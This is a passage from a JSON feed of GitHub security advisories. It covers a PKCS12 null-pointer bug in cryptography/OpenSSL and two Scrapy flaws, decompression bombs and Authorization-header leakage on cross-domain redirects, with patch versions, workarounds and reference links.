href=\"https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c\">https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c</a></li>\n<li><a href=\"https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8\">https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8</a></li>\n<li><a href=\"https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539\">https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539</a></li>\n<li><a href=\"https://www.openssl.org/news/secadv/20240125.txt\">https://www.openssl.org/news/secadv/20240125.txt</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/3472\">https://github.com/github/advisory-database/pull/3472</a></li>\n<li><a href=\"https://github.com/openssl/openssl/pull/23362\">https://github.com/openssl/openssl/pull/23362</a></li>\n<li><a href=\"https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2\">https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2</a></li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d\">https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20240208-0006\">https://security.netapp.com/advisory/ntap-20240208-0006</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9v9h-cgj8-h64p\">https://github.com/advisories/GHSA-9v9h-cgj8-h64p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9v9h-cgj8-h64p",
            "title": "[cryptography] Null pointer dereference in PKCS12 parsing",
            "date_modified": "2024-02-16T20:48:37.000Z",
            "date_published": "2024-01-26T09:30:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9v9h-cgj8-h64p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Scrapy limits allowed response sizes by default through the <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-maxsize\"><code>DOWNLOAD_MAXSIZE</code></a> and <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-warnsize\"><code>DOWNLOAD_WARNSIZE</code></a> settings.</p>\n<p>However, those limits were only being enforced during the download of the raw, usually-compressed response bodies, and not during decompression, making Scrapy vulnerable to <a href=\"https://cwe.mitre.org/data/definitions/409.html\">decompression bombs</a>.</p>\n<p>A malicious website being scraped could send a small response that, on decompression, could exhaust the memory available to the Scrapy process, potentially affecting any other process sharing that memory, and affecting disk usage in case of uncompressed response caching.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no easy workaround.</p>\n<p>Disabling HTTP decompression altogether is impractical, as HTTP compression is a rather common practice.</p>\n<p>However, it is technically possible to manually backport the 2.11.1 or 1.8.4 fix, replacing the corresponding components of an unpatched version of Scrapy with patched versions copied into your own code.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @dmandefy  <a href=\"https://huntr.com/bounties/c4a0fac9-0c5a-4718-9ee4-2d06d58adabb/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5\">https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f\">https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7",
            "title": "[scrapy] Scrapy decompression bomb vulnerability",
            "date_modified": "2024-02-16T16:07:15.000Z",
            "date_published": "2024-02-16T16:07:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Scrapy limits allowed response sizes by default through the <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-maxsize\"><code>DOWNLOAD_MAXSIZE</code></a> and <a href=\"https://docs.scrapy.org/en/latest/topics/settings.html#download-warnsize\"><code>DOWNLOAD_WARNSIZE</code></a> settings.</p>\n<p>However, those limits were only being enforced during the download of the raw, usually-compressed response bodies, and not during decompression, making Scrapy vulnerable to <a href=\"https://cwe.mitre.org/data/definitions/409.html\">decompression bombs</a>.</p>\n<p>A malicious website being scraped could send a small response that, on decompression, could exhaust the memory available to the Scrapy process, potentially affecting any other process sharing that memory, and affecting disk usage in case of uncompressed response caching.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no easy workaround.</p>\n<p>Disabling HTTP decompression altogether is impractical, as HTTP compression is a rather common practice.</p>\n<p>However, it is technically possible to manually backport the 2.11.1 or 1.8.4 fix, replacing the corresponding components of an unpatched version of Scrapy with patched versions copied into your own code.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @dmandefy  <a href=\"https://huntr.com/bounties/c4a0fac9-0c5a-4718-9ee4-2d06d58adabb/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5\">https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f\">https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f</a></li>\n<li><a href=\"https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14\">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7j7m-v7m3-jqm7\">https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7",
            "title": "[scrapy] Scrapy decompression bomb vulnerability",
            "date_modified": "2024-02-16T16:07:15.000Z",
            "date_published": "2024-02-16T16:07:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7j7m-v7m3-jqm7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When you send a request with the <code>Authorization</code> header to one domain, and the response asks to redirect to a different domain, Scrapys built-in redirect middleware creates a follow-up redirect request that keeps the original <code>Authorization</code> header, leaking its content to that second domain.</p>\n<p>The <a href=\"https://fetch.spec.whatwg.org/#ref-for-cors-non-wildcard-request-header-name\">right behavior</a> would be to drop the <code>Authorization</code> header instead, in this scenario.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.11.1.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, make sure that you are not using the <code>Authentication</code> header, either directly or through some third-party plugin.</p>\n<p>If you need to use that header in some requests, add <code>\"dont_redirect\": True</code> to the <code>request.meta</code> dictionary of those requests to disable following redirects for them.</p>\n<p>If you need to keep (same domain) redirect support on those requests, make sure you trust the target website not to redirect your requests to a different domain.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>This security issue was reported by @ranjit-git  <a href=\"https://huntr.com/bounties/49974321-2718-43e3-a152-62b16eed72a9/\">through huntr.com</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae\">https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cw9j-q3vf-hrrv\">https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cw9j-q3vf-hrrv",
            "title": "[scrapy] Scrapy authorization header leakage on cross-domain redirect",
            "date_modified": "2024-02-15T15:32:17.000Z",
            "date_published": "2024-02-15T15:32:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cw9j-q3vf-hrrv"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}